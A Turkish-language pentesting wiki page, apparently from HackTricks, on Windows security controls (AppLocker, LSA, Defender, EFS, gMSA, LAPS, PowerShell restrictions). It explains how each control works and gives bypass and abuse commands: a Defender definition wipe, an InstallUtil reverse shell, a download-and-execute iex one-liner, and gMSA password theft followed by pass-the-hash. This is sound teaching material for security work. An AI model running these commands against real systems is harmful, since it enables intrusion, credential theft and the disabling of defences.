# Windows Security Controls

{{#include ../../banners/hacktricks-training.md}}

## AppLocker Policy

An application whitelist, bir sistemde bulunmasına ve çalıştırılmasına izin verilen onaylı yazılım uygulamalarının veya yürütülebilir dosyaların listesidir. Amaç, ortamı zararlı malware'lerden ve bir kuruluşun belirli iş ihtiyaçlarıyla uyumlu olmayan onaysız yazılımlardan korumaktır.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker), Microsoft'un **application whitelisting solution** çözümüdür ve sistem yöneticilerine **kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği** üzerinde kontrol sağlar. Yürütülebilir dosyalar, script'ler, Windows installer dosyaları, DLL'ler, paketlenmiş uygulamalar ve paketlenmiş uygulama installer'ları üzerinde **ayrıntılı kontrol** sunar.\
Kuruluşların **cmd.exe ve PowerShell.exe'yi engellemesi** ve belirli dizinlere yazma erişimini kısıtlaması yaygındır, **ancak bunların tümü bypass edilebilir**.

### Kontrol

Hangi dosyaların/uzantıların blacklisted/whitelisted olduğunu kontrol edin:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Bu registry path, AppLocker tarafından uygulanan yapılandırmaları ve ilkeleri içerir ve sistemde yürürlükte olan mevcut kuralları incelemek için bir yol sağlar:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy'yi bypass etmek için kullanışlı **Writable folders**: AppLocker, `C:\Windows\System32` veya `C:\Windows` içindeki herhangi bir şeyi çalıştırmaya izin veriyorsa, bunu **bypass etmek** için kullanabileceğiniz **writable folders** bulunur.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Yaygın olarak **güvenilen** [**"LOLBAS"**](https://lolbas-project.github.io/) binary'leri AppLocker'ı bypass etmek için de kullanılabilir.
- **Kötü yazılmış kurallar da bypass edilebilir**
- Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** için herhangi bir yerde **`allowed` adlı bir klasör** oluşturabilirsiniz ve bu klasöre izin verilir.
- Kuruluşlar ayrıca genellikle **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable'ını** engellemeye odaklanır, ancak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe` gibi diğer [**PowerShell executable konumlarını**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) gözden kaçırır.
- **DLL enforcement**, bir sistem üzerinde oluşturabileceği ek yük ve hiçbir şeyin bozulmayacağından emin olmak için gereken test miktarı nedeniyle çok nadiren etkinleştirilir. Bu nedenle **DLL'leri backdoor olarak kullanmak AppLocker'ı bypass etmeye yardımcı olur**.
- Herhangi bir process içinde **Powershell** kodu çalıştırmak ve AppLocker'ı bypass etmek için [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanabilirsiniz. Daha fazla bilgi için şuraya bakın: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

Local credentials bu dosyada bulunur; parolalar hash'lenmiştir.

### Local Security Authority (LSA) - LSASS

**Credentials** (hash'lenmiş), Single Sign-On nedenleriyle bu subsystem'in **memory**'sinde **saklanır**.\
**LSA**, local **security policy**'yi (password policy, users permissions...), **authentication**'ı, **access tokens**'ları... yönetir.\
LSA, sağlanan credentials'ları **SAM** dosyasında (local login için) kontrol edecek ve bir domain user'ı authenticate etmek için **domain controller** ile **iletişim kuracak** bileşendir.

**Credentials**, **LSASS process**'inin içinde **saklanır**: Kerberos ticket'ları, NT ve LM hash'leri, kolayca decrypt edilebilen parolalar.

### LSA secrets

LSA bazı credentials'ları diskte saklayabilir:

- Active Directory computer account'unun parolası (ulaşılamayan domain controller).
- Windows service account'larının parolaları
- Scheduled task'lar için parolalar
- Daha fazlası (IIS application'larının parolası...)

### NTDS.dit

Active Directory'nin database'idir. Yalnızca Domain Controller'larda bulunur.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender), Windows 10 ve Windows 11'de ve Windows Server sürümlerinde bulunan bir Antivirus'tür. **`WinPEAS`** gibi yaygın pentesting tool'larını **block eder**. Ancak bu **protection'ları bypass etmenin yolları** vardır.

### Check

**Defender**'ın **status**'ünü kontrol etmek için PS cmdlet'i **`Get-MpComputerStatus`**'u çalıştırabilirsiniz (aktif olup olmadığını öğrenmek için **`RealTimeProtectionEnabled`** değerini kontrol edin):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Bunu enumerate etmek için şunu da çalıştırabilirsiniz:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS, **File Encryption Key (FEK)** olarak bilinen bir **symmetric key** kullanarak dosyaları encryption ile güvence altına alır. Bu key, kullanıcının **public key**'iyle encryption edilir ve encrypted file'ın $EFS **alternative data stream**'i içinde saklanır. Decryption gerektiğinde, kullanıcının digital certificate'ının karşılık gelen **private key**'i, $EFS stream'inden FEK'i decrypt etmek için kullanılır. Daha fazla ayrıntı [burada](https://en.wikipedia.org/wiki/Encrypting_File_System) bulunabilir.

**Kullanıcı başlatmadan gerçekleşen decryption senaryoları** şunlardır:

- Dosyalar veya klasörler [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) gibi EFS olmayan bir file system'a taşındığında otomatik olarak decrypt edilir.
- SMB/CIFS protocol üzerinden network aracılığıyla gönderilen encrypted files, transmission öncesinde decrypt edilir.

Bu encryption yöntemi, owner için encrypted files'a **transparent access** sağlar. Ancak yalnızca owner'ın password'ünü değiştirmek ve login olmak decryption yapılmasına izin vermez.

**Key Takeaways**:

- EFS, kullanıcının public key'iyle encrypted edilen symmetric bir FEK kullanır.
- Decryption, FEK'e erişmek için kullanıcının private key'ini kullanır.
- FAT32'ye kopyalama veya network üzerinden transmission gibi belirli koşullarda automatic decryption gerçekleşir.
- Encrypted files, owner tarafından ek bir işlem yapılmadan erişilebilir.

### EFS info'yu kontrol etme

Bir **user**'ın bu **service**'i **kullanıp kullanmadığını**, şu path'in mevcut olup olmadığını kontrol ederek anlayın:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

`cipher /c \<file\>` kullanarak file'a **kimlerin** erişimi olduğunu kontrol edin\
Bir klasörün içinde `cipher /e` ve `cipher /d` kullanarak tüm files'ları **encrypt** ve **decrypt** edebilirsiniz

### EFS files'larını decrypt etme

#### Authority System olmak

Bu yöntem, **victim user**'ın host içinde bir **process** **çalıştırıyor** olmasını gerektirir. Durum buysa, bir `meterpreter` session kullanarak user'ın process'inin token'ını (`incognito` içindeki `impersonate_token`) impersonate edebilirsiniz. Alternatif olarak user'ın process'ine `migrate` edebilirsiniz.

#### User'ın password'ünü bilmek


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft, IT infrastructure'larında service accounts yönetimini kolaylaştırmak için **Group Managed Service Accounts (gMSA)** geliştirdi. Genellikle "**Password never expire**" ayarı etkin olan traditional service accounts'ın aksine, gMSA'ler daha secure ve manage edilebilir bir çözüm sunar:

- **Automatic Password Management**: gMSA'ler, domain veya computer policy'ye göre otomatik olarak değişen, 240 karakterlik karmaşık bir password kullanır. Bu process, Microsoft'un Key Distribution Service (KDC)'si tarafından yönetilir ve manual password updates gereksinimini ortadan kaldırır.
- **Enhanced Security**: Bu accounts lockout'lara karşı bağışıktır ve interactive login'ler için kullanılamaz; bu da security'lerini artırır.
- **Multiple Host Support**: gMSA'ler birden fazla host arasında paylaşılabilir; bu da onları birden çok server'da çalışan services için ideal hale getirir.
- **Scheduled Task Capability**: managed service accounts'ın aksine, gMSA'ler scheduled tasks çalıştırmayı destekler.
- **Simplified SPN Management**: Computer'ın sAMaccount details'ında veya DNS name'inde değişiklik olduğunda system, Service Principal Name (SPN)'i otomatik olarak update eder ve SPN management'ı kolaylaştırır.

gMSA'lerin password'leri LDAP property'si _**msDS-ManagedPassword**_ içinde saklanır ve Domain Controllers (DCs) tarafından her 30 günde bir otomatik olarak reset edilir. [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen encrypted data blob biçimindeki bu password, yalnızca authorized administrators ve gMSA'lerin kurulu olduğu servers tarafından retrieve edilebilir; böylece secure bir environment sağlanır. Bu information'a erişmek için LDAPS gibi secured bir connection gerekir veya connection'ın 'Sealing & Secure' ile authenticated olması gerekir.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)<sup>[[1]](#references)</sup>

Bu password'ü [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup> ile okuyabilirsiniz.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Bu gönderide daha fazla bilgi bulabilirsiniz**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[1]](#references)</sup>

Ayrıca, **gMSA**'nin **password** değerini **okumak** için **NTLM relay attack** gerçekleştirme hakkında bu [web sayfasına](https://cube0x0.github.io/Relaying-for-gMSA/) göz atın.<sup>[[1]](#references)</sup>

### gMSA managed password değerini okumak için ACL chaining'i kötüye kullanma (GenericAll -> ReadGMSAPassword)

Birçok ortamda, düşük ayrıcalıklı kullanıcılar yanlış yapılandırılmış object ACL'lerini kötüye kullanarak DC compromise olmadan gMSA secrets değerlerine erişebilir:<sup>[[3]](#references)</sup>

- Kontrol edebildiğiniz bir gruba (ör. GenericAll/GenericWrite aracılığıyla) bir gMSA üzerinde `ReadGMSAPassword` izni verilmiştir.
- Kendinizi bu gruba ekleyerek, gMSA'nin `msDS-ManagedPassword` blob değerini LDAP üzerinden okuma ve kullanılabilir NTLM credentials elde etme hakkını devralırsınız.

Tipik workflow:

1) BloodHound ile yolu keşfedin ve foothold principals değerlerinizi Owned olarak işaretleyin. Şu tür edge'leri arayın:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Kontrol ettiğiniz intermediate group'a kendinizi ekleyin (`bloodyAD` örneği):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) gMSA managed password'ını LDAP üzerinden okuyun ve NTLM hash'ini türetin. NetExec, `msDS-ManagedPassword` extraction'ını ve NTLM'ye conversion'ını otomatikleştirir:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) gMSA olarak NTLM hash kullanarak authenticate olun (plaintext gerekmez). Hesap Remote Management Users grubundaysa WinRM doğrudan çalışır:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notlar:
- `msDS-ManagedPassword` için LDAP okumaları sealing gerektirir (ör. LDAPS/sign+seal). Tools bunu otomatik olarak gerçekleştirir.
- gMSA'lara genellikle WinRM gibi yerel haklar verilir; lateral movement planlamak için grup üyeliğini (ör. Remote Management Users) doğrulayın.
- Blob'a yalnızca NTLM'yi kendiniz hesaplamak için ihtiyacınız varsa MSDS-MANAGEDPASSWORD_BLOB yapısına bakın.



## LAPS

İndirilmek üzere [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) tarafından sunulan **Local Administrator Password Solution (LAPS)**, yerel Administrator parolalarının yönetilmesini sağlar. **Randomized**, benzersiz ve **düzenli olarak değiştirilen** bu parolalar, Active Directory'de merkezi olarak depolanır. Bu parolalara erişim, ACL'ler aracılığıyla yetkili kullanıcılarla sınırlandırılır. Yeterli izinler verildiğinde, yerel admin parolalarını okuma olanağı sağlanır.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/), PowerShell'i etkili şekilde kullanmak için gereken özelliklerin çoğunu **kısıtlar**; örneğin COM nesnelerini engeller, yalnızca onaylanmış .NET türlerine izin verir, XAML tabanlı workflow'ları, PowerShell sınıflarını ve daha fazlasını kısıtlar.

### **Kontrol**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Güncel Windows sürümlerinde bu Bypass çalışmaz; ancak [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) kullanabilirsiniz.\
**Derlemek için** **şunları yapmanız gerekebilir:** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` ekleyin ve **projeyi .Net4.5 olarak değiştirin**.

#### Doğrudan bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak herhangi bir process içinde **Powershell** kodu çalıştırabilir ve constrained mode'u bypass edebilirsiniz. Daha fazla bilgi için: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS Execution Policy

Varsayılan olarak **restricted** olarak ayarlanmıştır. Bu policy'yi bypass etmenin başlıca yolları:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Daha fazlasını [burada](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup> bulabilirsiniz.

## Security Support Provider Interface (SSPI)

Kullanıcıların kimliğini doğrulamak için kullanılabilen API'dir.

SSPI, iletişim kurmak isteyen iki makine için uygun protokolü bulmaktan sorumludur. Bunun için tercih edilen yöntem Kerberos'tur. Ardından SSPI, hangi kimlik doğrulama protokolünün kullanılacağını müzakere eder. Bu kimlik doğrulama protokollerine Security Support Provider (SSP) adı verilir; her Windows makinesinin içinde DLL biçiminde bulunurlar ve iletişim kurulabilmesi için her iki makinenin de aynı SSP'yi desteklemesi gerekir.

### Ana SSP'ler

- **Kerberos**: Tercih edilen
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** ve **NTLMv2**: Uyumluluk nedenleriyle
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web sunucuları ve LDAP için; parola MD5 hash'i biçimindedir
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL ve TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Kullanılacak protokolü müzakere etmek için kullanılır (Kerberos veya NTLM; varsayılan Kerberos'tur)
- %windir%\Windows\System32\lsasrv.dll

#### Müzakere birkaç yöntem veya yalnızca bir yöntem sunabilir.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş etkinlikler için onay istemi** sağlayan bir özelliktir.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## Referanslar

- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [5] [NetSPI – 15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

{{#include ../../banners/hacktricks-training.md}}
